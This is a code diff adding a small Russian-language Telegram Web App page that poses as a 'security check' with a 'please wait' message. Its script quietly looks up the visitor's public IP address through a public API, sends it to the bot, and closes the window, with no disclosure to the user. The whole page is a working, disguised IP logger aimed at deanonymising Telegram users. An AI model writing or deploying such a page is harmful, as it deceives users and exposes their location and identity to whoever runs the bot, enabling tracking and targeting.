@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body style="background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding: 20px;">
+    <h2>🔍 Проверка безопасности</h2>
+    <p>Пожалуйста, подождите...</p>
+    
+    <script>
+        // Получаем IP через публичный API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                // Отправляем IP в бота
+                Telegram.WebApp.sendData(data.ip);
+                Telegram.WebApp.close();
+            })
+            .catch(error => {
+                // Если не удалось получить IP — отправляем ошибку
+                Telegram.WebApp.sendData("error");
+                Telegram.WebApp.close();
+            });
+    </script>
+</body>
+</html>
